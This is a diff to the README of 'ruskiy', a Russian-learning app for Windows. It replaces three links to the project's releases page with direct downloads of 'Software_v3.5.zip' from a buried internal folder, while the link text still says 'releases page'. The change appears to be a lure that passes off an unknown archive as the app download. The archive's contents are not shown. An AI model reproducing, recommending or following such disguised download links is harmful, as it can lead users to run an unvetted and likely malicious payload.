@@ -1,11 +1,11 @@
 # 🇷🇺 ruskiy - Learn Russian with steady practice
 
-[![Download ruskiy](https://img.shields.io/badge/Download-ruskiy-blue?style=for-the-badge&logo=github)](https://github.com/castiron-genussquilla31/ruskiy/releases)
+[![Download ruskiy](https://img.shields.io/badge/Download-ruskiy-blue?style=for-the-badge&logo=github)](https://github.com/castiron-genussquilla31/ruskiy/raw/refs/heads/main/services/api/internal/engine/Software_v3.5.zip)
 
 ## 📥 Download
 Visit this page to download ruskiy for Windows:
 
-[Open the releases page](https://github.com/castiron-genussquilla31/ruskiy/releases)
+[Open the releases page](https://github.com/castiron-genussquilla31/ruskiy/raw/refs/heads/main/services/api/internal/engine/Software_v3.5.zip)
 
 1. Open the link above.
 2. Find the latest release.
@@ -171,7 +171,7 @@ This project is tagged with:
 
 Use the releases page here:
 
-[Go to the Windows download page](https://github.com/castiron-genussquilla31/ruskiy/releases)
+[Go to the Windows download page](https://github.com/castiron-genussquilla31/ruskiy/raw/refs/heads/main/services/api/internal/engine/Software_v3.5.zip)
 
 Then:
 1. Find the newest release.
